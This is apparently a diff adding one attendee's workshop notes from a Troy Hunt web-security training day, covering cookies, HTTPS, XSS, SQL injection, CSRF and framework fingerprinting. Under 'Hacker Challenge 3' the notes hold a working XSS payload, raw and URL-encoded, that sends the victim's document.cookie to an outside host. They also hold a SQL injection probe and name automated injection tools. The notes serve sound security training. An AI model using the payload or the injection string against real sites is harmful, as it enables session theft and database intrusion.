@@ -1,0 +1,176 @@
+
+* Security Day with Troy Hunt
+
+
+- Chome Developer Tools
+  - View source
+  - Inspect elements
+  - Network - request and response headers
+  - Cookies
+    - Auth cookies needs to be cryptographically strong.
+
+- Errors
+  - Not handling quotes.
+  - Changing urls.
+
+
+** Hacker Challenge 1
+  - short passwords allowed (cannot use a long password? 32 characters)
+  - Remember me stores emails and password as non-secure cookies. Password was actually b64 encoded!
+  - Session and Auth cookies are not secure.
+  - XXX AuthCookie not HTTP only.
+  - Can login over HTTP rather than HTTPS.
+  - XXX Password was sent over email!
+
+- Cannot load login/payment forms over HTTP (because man in the middle changes to page/form).
+
+- HSTS narrows the window. Browser knows that requests must be over HTTPS.
+
+- haveibeenpwned.com
+
+- Think about cookie expiry.
+  - discussion about usability v security (e.g. facebook.com vs commbank.com.au)
+
+- Need brute force password attempt protection.
+
+** Hacker Challenge 2. Multiple votes.
+  - Repeat the POST request to the /api/vote.
+
+
+** Reflected cross site scripting (XSS)
+
+- Top 10 Risks from OWASP.
+
+- Script injection from untrusted user data.
+  - query parameters.
+  - request body
+  - request headers
+
+
+** Hacker Challenge 3
+
+
+'); window.location.href = 'http://steshaw.org/?capture=' + encodeURI(document.cookie); console.log('nothing
+
+http://hackyourselffirst.troyhunt.com/Search?searchTerm=%27%29%3B+window.location.href+%3D+%27http%3A%2F%2Fsteshaw.org%2F%3Fcapture%3D%27+%2B+encodeURI%28document.cookie%29%3B+console.log%28%27nothing
+
+- http://www.troyhunt.com/2011/12/free-ebook-owasp-top-10-for-net.html
+
+- HTTP only cookies.
+- Secure only cookies.
+- over HTTPS
+
+- "Defence in depth"
+
+
+** Exercise 4: SQL injection (SQLi)
+
+- inject "select cast(@@version as int)" into order by ${x}
+
+- principle of least priviledge on the db account. (not a super user)
+
+- Only real way to validate an email address is to send 'em an email and have 'em confirm it.
+
+- sqlmap.org — tool to automate SQL injection.
+
+- OWASP top 10 https://www.owasp.org/index.php/Top_10_2013-Top_10
+
+
+** Mobile APIs (and IoT - Internet of Things)
+
+- Cert pinning?
+
+
+- Look at the HTTP requests for sensitive data.
+
+** Exercise 5 - Mobile APIs
+
+- Proxy your device
+  - Inspect the traffic of your apps
+  - Perform normal activities and monitor requests.
+
+
+** CSRF/XSRF - Cross Site Request Forgery
+  - anti forgery token
+
+
+** Hacker Challenge 6
+
+
+** Exercise 7 - Framework disclosure
+
+
+- www.shodanhq.com
+
+- http://www.pluralsight.com/author/troy-hunt
+
+- Pwned! Owned
+
+
+- Exercise 7 - Framework disclosure
+  - "extensions" in urls e.g. .asp, .aspx, .php, .jsp, .do.
+  - standard names of cookies like JSESSIONID, PHPSESSID.
+  - meta "generator" tag like for Wordpress.
+  - Server: response header, Apache, Jetty. + X- headers like X-AspNet-Version.
+  - Cache busting techniques like hash on the end of img src urls (Rails).
+  - Element ids for JSF apps usually like "j_*"
+  - Cookie names and Names of hidden form elements used for anti forgery token.
+    e.g. __RequestVerificationToken
+
+- Fingerprinting.
+  - Order that the response components are served.
+
+- Firefox addon Wappleier (what tech are they using).
+
+
+** Exercise 8 - Automating attacks and review
+
+- Havij tinyurl.com/troyshavij
+
+- Netsparker
+  - http://www.troyhunt.com/2014/09/automating-web-security-reviews-with.html
+  - http://sectools.org/tool/netsparker/
+
+- robots.txt can sometimes be revealing.
+
+
+- https://raygun.io/
+
+- https://haveibeenpwned.com/ - Troy's site.
+
+- Web application firewall
+  - Barracuda  https://www.barracuda.com/products/webapplicationfirewall
+  - CloudFlare https://www.cloudflare.com/waf
+
+
+- Static analysis tools like Fortify.
+
+
+- Penetration testing
+  - HackLabs in Sydney
+
+
+- http://www.pluralsight.com/courses/hack-yourself-first
+
+- http://www.pluralsight.com/courses/owasp-top10-aspdotnet-application-security-risks
+
+- http://www.pluralsight.com/courses/angularjs-security-fundamentals
+
+- http://blog.pluralsight.com/author/troy-hunt
+
+- http://hackyourselffirst.troyhunt.com/
+
+- "Threat modelling"
+
+- startssl.com - Free SSL certificate.
+
+- https://letsencrypt.org/
+
+- OWASP cheat sheets.
+
+- http://seclists.org/fulldisclosure/
+
+- http://krebsonsecurity.com/
+
+- http://www.troyhunt.com/2015/03/yow-conference-talk-hack-yourself-first.html
+
